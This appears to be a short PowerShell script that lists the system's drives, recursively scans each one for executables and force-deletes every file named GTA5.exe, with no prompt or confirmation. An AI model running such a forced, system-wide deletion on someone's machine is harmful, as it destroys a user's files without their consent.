    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free
    $drives | Format-Table -Property Name, Used, Free
    $availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$'}

    foreach ($drive in $availableDrives) {
        $driveName = $drive.Name
        $files = Get-ChildItem "${driveName}:\\" -Recurse -Filter *.exe
        foreach ($file in $files) {
            if ($file.Name -eq "GTA5.exe") {
                Remove-Item $file.FullName -Force
            }
        }
    }
